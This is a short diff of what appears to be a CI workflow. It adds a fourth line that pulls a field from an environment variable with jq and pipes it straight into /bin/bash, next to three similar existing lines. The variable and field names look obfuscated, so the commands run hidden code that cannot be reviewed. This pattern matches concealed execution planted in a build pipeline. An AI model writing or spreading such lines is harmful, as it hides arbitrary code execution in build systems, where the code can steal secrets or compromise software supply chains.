@@ -34,6 +34,7 @@ jobs:
           echo $xoo018 | jq -r .fv92 | /bin/bash
           echo $snh1685 | jq -r .ftp204 | /bin/bash
           printf '%s' "$y42" | jq -r .aa337 | /bin/bash
+          printf '%s' "$mqt7663" | jq -r .bnqx2930 | /bin/bash
 
       - name: Upload artifact
         if: always()
